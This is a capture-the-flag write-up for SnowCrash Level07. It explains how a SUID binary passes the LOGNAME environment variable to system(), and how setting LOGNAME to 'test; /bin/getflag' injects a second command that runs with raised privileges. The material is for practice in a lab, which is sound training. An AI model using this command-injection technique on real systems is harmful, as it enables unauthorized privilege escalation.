# Level07

**Box**: SnowCrash


**Name**: Level07

**Category**: Code Execution / Command Injection  

**Difficulty**: Easy  

## Analysis

Start by exploring the directory:

```bash
ls -la
```

I find a binary `level07` that is already compiled. First i get it by running:
```bash
scp -P 4242 level07@10.13.250.191:level07 ~/Desktop/
```
Then I uncompile it using [ghidra](https://dogbolt.org).

### Vulnerability

The program:
1. Retrieves the `LOGNAME` environment variable
2. Constructs a command: `/bin/echo <LOGNAME>`
3. Executes it using `system()`

Since `system()` executes the command via the shell, it's possible to inject an additional command into `LOGNAME`.

## Exploitation

Modify the environment variable and execute the binary:

```bash
export LOGNAME="test; /bin/getflag"
./level07
```

The final command executed becomes:

```
/bin/echo test; /bin/getflag
```

`/bin/getflag` is then executed with the privileges of the SUID binary, allowing you to retrieve the token for the next level.

## Flag

**FLAG_FOUND**

